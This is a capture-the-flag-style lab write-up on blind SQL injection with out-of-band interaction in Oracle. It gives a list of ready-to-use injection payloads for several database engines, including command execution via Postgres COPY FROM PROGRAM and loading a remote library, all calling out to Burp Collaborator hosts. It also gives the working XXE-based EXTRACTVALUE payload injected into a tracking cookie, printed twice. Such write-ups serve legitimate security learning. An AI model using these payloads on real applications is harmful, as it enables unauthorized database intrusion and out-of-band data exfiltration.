# Blind SQL injection with out-of-band interaction

*A clean write‑up using my original steps and **raw payloads** (kept as‑is), plus a concise explanation of how XML entities cause DNS/HTTP from Oracle.*

---

## 🎯 Goal
**Make the application trigger an external DNS request** (to Burp Collaborator) from an Oracle query context.

> ⚠️ Use only in labs or with explicit authorization.

---

## ✅ My Exact Steps (verbatim, lightly corrected)

1. **GOAL:** make a dns request to the outside.  
2. **get my dns service** from burp collaborator.  
3. **Find the vulnerable parameter,** here i was already freaking lost.  
4. **i've tried these:**
```
UNION SELECT UTL_INADDR.get_host_address('abc.oastify.com') FROM dual--
UNION SELECT DBMS_LDAP.INIT('abc.oastify.com',80) FROM dual--
UNION SELECT UTL_HTTP.request('http://abc.oastify.com/') FROM dual--
;exec master..xp_dirtree '\abc.oastify.com\foobar'--
;exec master..xp_fileexist '\abc.oastify.com\test'--
;exec master..xp_subdirs '\abc.oastify.com\share'--
DROP TABLE IF EXISTS tmp;
CREATE TABLE tmp(content text);
COPY tmp FROM PROGRAM 'nslookup abc.oastify.com';
COPY (SELECT '') TO PROGRAM 'nslookup abc.oastify.com';
SELECT LOAD_FILE('\\abc.oastify.com\share')--
SELECT '' INTO OUTFILE '\\abc.oastify.com\test'--
SELECT load_extension('//abc.oastify.com/malicious')--
SELECT * FROM sysibm.sysdummy1
WHERE 1 = (SELECT COUNT(*) FROM TABLE(SYSPROC.HTTPGETCLOB('http://abc.oastify.com')) AS t);)
EXECUTE FUNCTION task("system", "nslookup abc.oastify.com");
```
5. **all of them did not give me anything,** i looked at the hint and looked into the cheat sheet, there i found (see image 2)  
6. **grabbed the first one:**
```
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://h5nnagj86o33oxbqhquuydvzwq2hqaez/"> %remote;]>'),'/l') FROM dual
```
7. **and change the value to my collaborator.**  
8. 
```
TrackingId=vPyKqZhnLDfhXNHu'||SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"4chah3qvdbaqvkidod1h502m3d94xvlk.oastify.com">+%25remote%3b]>'),'/l')+FROM+dual||'
```
9. **it didnt work,** so i thought maybe the reason is how i concatenate my query, i used union:  
10.
```
'UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"h5nnagj86o33oxbqhquuydvzwq2hqaez.oastify.com">+%25remote%3b]>'),'/l')+FROM+dual--;
```
11. **this didnt work either..**  
12. **i tried using https:// -> so i can trigger a dns, it didnt work.**  
13. **then realised burp might be using http only.. so i used:**  
14.
```
'UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://h5nnagj86o33oxbqhquuydvzwq2hqaez.oastify.com">+%25remote%3b]>'),'/l')+FROM+dual--
```
15. **Lab solved!** ✅

---

## 🧠 How this works (Oracle + XML + DNS)

**What’s going on?**  
You’re leveraging **XML External Entity (XXE)** resolution inside Oracle’s XML parser. When you call:
```sql
EXTRACTVALUE(XMLTYPE('<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://collab.example/"> %remote; ]>'), '/l')
```
you embed a **parameter entity** `%remote` that points to a **remote URL**. During DTD/entity resolution, Oracle’s XML parser **fetches** that external resource. That network fetch emits **DNS and HTTP** traffic to your Burp Collaborator domain — which is your OOB signal.

**Why your other packages failed:**  
- `UTL_INADDR`, `UTL_HTTP`, `DBMS_LDAP` and friends are often **blocked by network ACLs/privileges** in modern Oracle; labs frequently restrict these.  
- The XML parser’s external entity resolution path is sometimes **less restricted**, so the **XXE trick succeeds** even when the networking packages are blocked.  
- HTTPS may fail due to TLS/ACL/cert constraints, while plain **HTTP** often succeeds — DNS still happens either way, but the parser may skip on errors before issuing the request in some configs.

**Key pieces**  
- **`XMLTYPE(...)`**: Constructs an internal XML value.  
- **`<!DOCTYPE ...>` with `<!ENTITY % remote SYSTEM "http://...">`**: Declares a **parameter entity** that references your external URL.  
- **`%remote;`**: Expands the entity; expansion **forces the fetch**.  
- **`EXTRACTVALUE(..., '/l')`**: Evaluates an XPath (here, arbitrary) to “use” the XML; the important side effect is the **fetch** during parsing, not the XPath result.

> Note: `EXTRACTVALUE` is deprecated in later Oracle versions; alternatives include `XMLQuery`, `XMLExists`, etc. For OOB testing, **any XML parse that resolves external entities** is enough to trigger the request.

---

## 🧩 Practical notes & guardrails

- **Privileges/ACLs:** Outbound networking from the DB often requires **ACL grants** (e.g., `DBMS_NETWORK_ACL_ADMIN`). Labs may preconfigure this; real systems usually lock it down.  
- **Detection:** Your Collaborator should show **DNS/HTTP hits** if the parser tried to resolve the entity.  
- **Safer testing:** Always have written permission; XXE and OOB can leak sensitive metadata/IMDS endpoints if misused. Keep scope tight.  
- **Non‑Oracle routes (FYI):** Other DBs have their own OOB gadgets (e.g., SQL Server `xp_dirtree`, Postgres `COPY PROGRAM`), but they are usually disabled in hardened setups — hence the XML path is attractive in Oracle labs.

---

## 📎 Raw payloads I used (kept exactly)
```
UNION SELECT UTL_INADDR.get_host_address('abc.oastify.com') FROM dual--
UNION SELECT DBMS_LDAP.INIT('abc.oastify.com',80) FROM dual--
UNION SELECT UTL_HTTP.request('http://abc.oastify.com/') FROM dual--
;exec master..xp_dirtree '\abc.oastify.com\foobar'--
;exec master..xp_fileexist '\abc.oastify.com\test'--
;exec master..xp_subdirs '\abc.oastify.com\share'--
DROP TABLE IF EXISTS tmp;
CREATE TABLE tmp(content text);
COPY tmp FROM PROGRAM 'nslookup abc.oastify.com';
COPY (SELECT '') TO PROGRAM 'nslookup abc.oastify.com';
SELECT LOAD_FILE('\\abc.oastify.com\share')--
SELECT '' INTO OUTFILE '\\abc.oastify.com\test'--
SELECT load_extension('//abc.oastify.com/malicious')--
SELECT * FROM sysibm.sysdummy1
WHERE 1 = (SELECT COUNT(*) FROM TABLE(SYSPROC.HTTPGETCLOB('http://abc.oastify.com')) AS t);)
EXECUTE FUNCTION task("system", "nslookup abc.oastify.com");

SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://h5nnagj86o33oxbqhquuydvzwq2hqaez/"> %remote;]>'),'/l') FROM dual

TrackingId=vPyKqZhnLDfhXNHu'||SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"4chah3qvdbaqvkidod1h502m3d94xvlk.oastify.com">+%25remote%3b]>'),'/l')+FROM+dual||'

'UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"h5nnagj86o33oxbqhquuydvzwq2hqaez.oastify.com">+%25remote%3b]>'),'/l')+FROM+dual--;

'UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://h5nnagj86o33oxbqhquuydvzwq2hqaez.oastify.com">+%25remote%3b]>'),'/l')+FROM+dual--
```

---

## 🏁 Result
- Switched from blocked network packages to an **XXE‑based OOB** in Oracle, forcing the XML parser to fetch our external entity over **HTTP**, which emitted the **DNS** request visible in Collaborator. **Lab Solved. ✅**
